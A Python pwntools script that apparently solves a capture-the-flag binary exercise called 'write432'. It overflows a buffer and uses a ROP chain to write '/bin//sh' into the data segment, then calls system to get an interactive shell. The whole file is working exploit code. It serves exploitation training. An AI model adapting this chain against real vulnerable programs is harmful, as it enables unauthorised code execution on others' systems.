#!/root/env/bin/python
from pwn import *
elf = context.binary = ELF("./write432")

gdb_cmd = [
    "c"
]

io = process(elf.path)
gdb.attach(io,gdbscript="\n".join(gdb_cmd))

offset = cyclic_find("laaa")
padding = "A"*offset

data_segment = 0x804a028
cmd = "/bin"
cmd_2 = "//sh"
rop_mov = 0x8048670
rop_pop = 0x80486da
system_plt = 0x08048430
exploit = p32(rop_pop)+p32(data_segment)+cmd+p32(rop_mov)+p32(rop_pop)+p32(data_segment+4)+cmd_2+p32(rop_mov)+p32(system_plt)+"blah"+p32(data_segment)

io.sendline(padding+exploit)
io.interactive()